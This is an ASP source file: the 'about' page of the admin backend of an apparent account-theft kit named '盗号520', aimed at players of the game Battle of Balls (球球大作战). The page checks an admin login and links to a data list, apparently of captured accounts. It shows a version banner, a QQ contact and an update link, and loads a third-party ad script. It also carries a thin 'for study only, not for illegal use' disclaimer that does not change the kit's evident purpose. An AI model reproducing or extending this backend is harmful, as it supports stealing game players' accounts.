<%@LANGUAGE="VBScript" codepage="936"%>
<!--#include file="conn.asp"-->
<%

If session("admin")="" then
    Response.Write "<script>alert('用户未登录，请登录');top.location.href='login.asp';</SCRIPT>"
	Response.End
End If
%>
<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>关于程序-盗号520</title>
  <link href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css" rel="stylesheet"/>
  <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script>
  <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
  
  <!--[if lt IE 9]>
    <script src="http://libs.useso.com/js/html5shiv/3.7/html5shiv.min.js"></script>
    <script src="http://libs.useso.com/js/respond.js/1.4.2/respond.min.js"></script>
  <![endif]-->
</head>
<body>
  <nav class="navbar navbar-fixed-top navbar-default">
    <div class="container">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
          <span class="sr-only">导航按钮</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <a class="navbar-brand" href="./">盗号520---球球大作战后台</a>
      </div><!-- /.navbar-header -->
      <div id="navbar" class="collapse navbar-collapse">
       <ul class="nav navbar-nav navbar-right">
		 <li>
           <a href="index.asp"><span class="glyphicon glyphicon-home"></span> 后台首页</a></li>
          <li>
           <a href="list.asp"><span class="glyphicon glyphicon-signal"></span> 数据列表</a>
         <!-- </li>
		  <li><a href="password.asp"><span class="glyphicon glyphicon-transfer"></span> 修改密码</a></li>-->
		    <li class="active"> <a href="about.asp"><span class="glyphicon glyphicon-tree-deciduous"></span> 关于程序</a></li>
			<li><a href="Exit.asp" target="_parent" ONCLICK="javascript:return confirm('提示：您确定要退出吗？')"><span class="glyphicon glyphicon-log-out"></span> 退出登录</a></li>
        </ul>
      </div><!-- /.navbar-collapse -->
    </div><!-- /.container -->
  </nav><!-- /.navbar -->
  <div class="container" style="padding-top:70px;">
   <div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">
  							
		<div class="row">
			<div class="col-md-12">
			<div class="panel panel-info">
					<div class="panel-heading"><span class="glyphicon glyphicon-cog"></span> 关于程序</div>
					<div class="panel-body box">
					<div class="alert alert-warning">本程序仅供学习参考 切勿用于一切非法活动！乘风QQ744768811</div>
					<div class="alert alert-success"><font color="green">欢迎使用盗号520程序！</font><br><font color="red">当前版本：V1.0.0（公开版）</font></div>
					 <a class="btn btn-primary btn-block" type="button"  href="https://jq.qq.com/?_wv=1027&k=44hxJx1" target="_blank">点击检测更新</a></div>
<!--九盟-->
				<script charset="gb2312" src="http://c1.yunluge.com/appios_c_1.asp?pid=23657&sid=6"></script>
			</div><!--/.col-->
			</div>
		</div><!--/.row-->
				</div> </div>
			
   
</body>
</html>